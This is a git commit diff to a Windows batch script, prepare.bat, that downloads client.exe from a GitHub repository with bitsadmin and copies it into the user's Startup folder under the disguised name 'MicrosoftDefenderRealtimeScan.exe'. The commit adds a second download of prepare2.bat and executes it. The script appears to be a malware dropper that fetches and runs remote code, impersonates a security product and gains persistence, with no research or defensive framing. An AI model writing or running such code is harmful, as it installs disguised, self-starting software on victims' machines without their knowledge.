b93ab87f9fb35346c3ad67d2f7c882477de73c31
simon0302010 <100756138+simon0302010@users.noreply.github.com>
2023-05-08 11:25:58 +0200

    Update prepare.bat

--- prepare.bat
+++ prepare.bat
@@ -1,4 +1,6 @@
 @echo off
 set "autostart_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftDefenderRealtimeScan.exe"
 bitsadmin.exe /transfer "clientdownload" https://github.com/simon0302010/temp/raw/main/client.exe client.exe
+bitsadmin.exe /transfer "prepare2download" https://github.com/simon0302010/temp/raw/main/prepare2.bat prepare2.bat
 copy "client.exe" "%autostart_folder%"
+start prepare2.bat
